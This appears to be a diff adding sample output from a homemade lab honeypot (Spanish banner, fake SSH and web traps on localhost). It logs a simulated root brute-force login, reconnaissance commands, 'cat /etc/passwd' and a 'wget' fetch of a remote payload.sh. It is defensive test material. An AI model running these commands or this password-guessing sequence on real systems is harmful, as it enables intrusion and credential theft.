@@ -1,0 +1,20 @@
+⚠  Honeypot de laboratorio — actividad autorizada
+   Trampa SSH (emulación en texto): 127.0.0.1:2222
+   Trampa web (login falso):         127.0.0.1:8080
+   Registro: /home/runer/Projects/github_proyectos/publico/honeypot-casero/logs/honeypot.jsonl
+   Ctrl-C para detener.
+
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 connect
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 login_attempt user=root password=123456 result=denied
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 login_attempt user=root password=admin result=denied
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 login_attempt user=root password=toor result=accepted
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 login_accepted user=root
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 command command=uname -a
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 command command=whoami
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 command command=id
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 command command=ls
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 command command=cat /etc/passwd
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 command command=wget http://198.51.100.7/payload.sh
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 download_attempt command=wget http://198.51.100.7/payload.sh url=http://198.51.100.7/payload.sh
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 command command=exit
+2026-11-20T23:46:48Z [ssh] 127.0.0.1:43312 session_end duration=0s
